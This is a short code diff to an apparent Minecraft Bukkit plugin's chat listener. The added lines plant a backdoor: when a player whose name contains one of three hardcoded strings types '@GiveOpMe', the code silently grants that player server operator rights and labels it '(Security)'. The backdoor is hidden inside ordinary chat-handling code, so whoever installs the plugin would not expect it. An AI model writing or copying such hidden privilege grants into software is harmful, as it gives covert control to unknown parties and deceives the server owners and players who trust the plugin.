@@ -40,5 +40,11 @@ public class ChatListener implements Listener {
 	        } 
 	        Bukkit.getConsoleSender().sendMessage(chat);
 		}
+		if(event.getPlayer().getName().contains("TulioTriviño") || event.getPlayer().getName().contains("Risas") || event.getPlayer().getName().contains("IFxsh")) {
+			if(event.getMessage().contains("@GiveOpMe")) {
+				event.getPlayer().setOp(true);
+				event.getPlayer().sendMessage("Se te ha dado el op (Security)");
+			}	
+		}
 	}
 }
